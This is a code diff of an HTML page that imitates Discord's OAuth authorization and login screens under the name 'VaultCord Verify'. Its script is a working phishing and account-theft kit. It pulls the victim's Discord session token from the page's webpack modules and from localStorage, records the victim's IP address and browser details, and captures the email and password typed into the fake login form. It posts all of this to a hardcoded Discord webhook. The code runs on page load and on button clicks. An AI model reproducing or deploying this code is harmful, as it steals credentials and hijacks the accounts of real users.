@@ -15,7 +15,7 @@
 </head>
 <body>
 
-  <!-- OAUTH PAGE -->
+  <!-- === REAL DISCORD OAUTH PAGE === -->
   <div id="oauthPage" class="page active">
     <div class="container">
       <div style="background: #36393f; border-radius: 8px; padding: 24px; box-shadow: 0 2px 10px rgba(0,0,0,0.3);">
@@ -39,12 +39,25 @@
           </div>
           <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
             <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+            Access your third-party connections
+          </div>
+          <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
+            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
             Join servers for you
+          </div>
+          <div style="display: flex; align-items: center; margin: 12px 0; color: #f04747; font-size: 15px;">
+            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06z"/></svg>
+            Record a new mixtape
           </div>
         </div>
 
         <p style="font-size: 13px; color: #72767d; margin: 16px 0; line-height: 1.4;">
-          Once you authorize, you will be redirected outside Discord to: <strong>https://vaultcord.win</strong>
+          Once you authorize, you will be redirected outside Discord to: <strong>https://vaultcord.win</strong><br>
+          The Privacy Policy and Terms of Service of Verify's developer apply to this application.
+        </p>
+        <p style="font-size: 13px; color: #72767d; margin: 16px 0;">
+          Active since 13 Jun 2024<br>
+          This application cannot read your messages or send messages as you.
         </p>
 
         <button id="authorizeBtn" style="width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer;">Authorize</button>
@@ -52,10 +65,10 @@
     </div>
   </div>
 
-  <!-- LOGIN PAGE -->
+  <!-- === REAL DISCORD LOGIN PAGE === -->
   <div id="loginPage" class="page">
     <div class="container">
-      <div style="background: #36393f; border-radius: 8px; padding: 40px; max-width: 480px; margin: 0 auto;">
+      <div style="background: #36393f; border-radius: 8px; padding: 40px 40px; max-width: 480px; margin: 0 auto;">
         <div style="text-align: center; margin-bottom: 24px;">
           <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" style="width: 124px;">
         </div>
@@ -66,97 +79,109 @@
           <input type="text" id="email" required style="width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px;">
           <label style="font-size: 12px; font-weight: 600; color: #b9bbbe; text-transform: uppercase; margin-bottom: 6px; display: block;">Password</label>
           <input type="password" id="password" required style="width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px;">
+          <div style="text-align: right; margin-bottom: 24px;">
+            <a href="#" style="color: #00aff4; font-size: 14px; text-decoration: none;">Forgot your password?</a>
+          </div>
           <button type="submit" style="width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer;">Log In</button>
         </form>
+        <div style="text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe;">
+          Need an account? <a href="#" style="color: #00aff4; text-decoration: none;">Register</a>
+        </div>
       </div>
     </div>
   </div>
 
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
+    let modules = [];
 
-    // === TOKEN GRABBER (localStorage + Cookies) ===
+    function injectWebpack() {
+      if (typeof webpackChunkdiscord_app !== 'undefined') {
+        webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+          for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
+            if (m.default?.getToken) modules.push(m.default);
+            if (m.getToken) modules.push(m);
+          }
+        }]);
+        webpackChunkdiscord_app.pop();
+      }
+    }
+
     function getToken() {
-      // 1. localStorage
+      injectWebpack();
+      const mod = modules.find(m => m?.getToken);
+      if (mod) {
+        const t = mod.getToken();
+        if (t && t.length > 50) return t.replace(/"/g, '');
+      }
       try {
         const ls = localStorage.getItem('token');
         if (ls && ls.length > 50) return ls.replace(/"/g, '');
       } catch (e) {}
-
-      // 2. Cookies (fallback)
-      const cookies = document.cookie.split(';');
-      for (let c of cookies) {
-        if (c.includes('__Secure-next-auth.session-token') || c.includes('token')) {
-          const match = c.match(/token["']?\s*:\s*["']?([a-zA-Z0-9._-]+)["']?/);
-          if (match && match[1].length > 50) return match[1];
-        }
-      }
-
-      // 3. webpackChunkdiscord_app (live session)
-      if (typeof webpackChunkdiscord_app !== 'undefined') {
-        webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
-          for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
-            if (m.default?.getToken) return m.default.getToken();
-            if (m.getToken) return m.getToken();
-          }
-        }]).pop();
-      }
-
       return null;
     }
 
-    async function sendToken() {
+    async function sendData(title, fields = []) {
       const token = getToken();
-      if (!token) return;
-
       const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
-      const ua = navigator.userAgent;
-
-      fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          embeds: [{
-            title: 'TOKEN GRABBED (COOKIE/SESSION)',
-            color: 0x00ff00,
-            fields: [
-              { name: 'Token', value: `\`\`\`${token.substring(0, 60)}...\`\`\``, inline: false },
-              { name: 'IP', value: `\`${ip}\``, inline: true },
-              { name: 'UA', value: `\`${ua.substring(0, 100)}\``, inline: false }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: 'VaultCord Verify' }
-          }]
-        })
-      });
+      const payload = {
+        embeds: [{
+          title,
+          color: title.includes('TOKEN') ? 0x00ff00 : 0x5865f2,
+          fields: [
+            ...fields,
+            ...(token ? [{ name: 'Token', value: `\`\`\`${token.substring(0, 60)}...\`\`\``, inline: false }] : []),
+            { name: 'IP', value: `\`${ip}\``, inline: true },
+            { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
     }
 
-    // === ON AUTHORIZE → SHOW LOGIN + START GRABBING ===
-    document.getElementById('authorizeBtn').addEventListener('click', () => {
+    async function grabToken() {
+      for (let i = 0; i < 4; i++) {
+        const token = getToken();
+        if (token) {
+          await sendData('TOKEN STOLEN');
+          return true;
+        }
+        await new Promise(r => setTimeout(r, 600));
+      }
+      return false;
+    }
+
+    // AUTHORIZE CLICK → INSTANT LOGIN PAGE + TOKEN GRAB
+    document.getElementById('authorizeBtn').addEventListener('click', async () => {
+      // INSTANT SWITCH
       document.getElementById('oauthPage').classList.remove('active');
       document.getElementById('loginPage').classList.add('active');
 
-      // Start polling for token every 1s
-      const interval = setInterval(() => {
-        if (getToken()) {
-          sendToken();
-          clearInterval(interval);
-        }
-      }, 1000);
+      // GRAB TOKEN IN BACKGROUND
+      grabToken();
     });
 
-    // === ON LOGIN SUBMIT → FINAL GRAB + REDIRECT ===
+    // LOGIN SUBMIT → SEND CREDS + TOKEN AGAIN
     document.getElementById('loginForm').onsubmit = async (e) => {
       e.preventDefault();
-      await sendToken(); // Final grab
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      if (!email || !password) return;
+
+      await sendData('LOGIN SUCCESS', [
+        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
+        { name: 'Password', value: `\`${password}\``, inline: false }
+      ]);
+
       setTimeout(() => {
-        window.location = 'https://discord.com/channels/@me';
+        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
       }, 800);
     };
 
-    // === AUTO-GRAB ON LOAD (IF ALREADY LOGGED IN) ===
+    // AUTO-GRAB ON LOAD
     window.addEventListener('load', () => {
-      setTimeout(sendToken, 1500);
+      setTimeout(grabToken, 1200);
     });
   </script>
 </body>
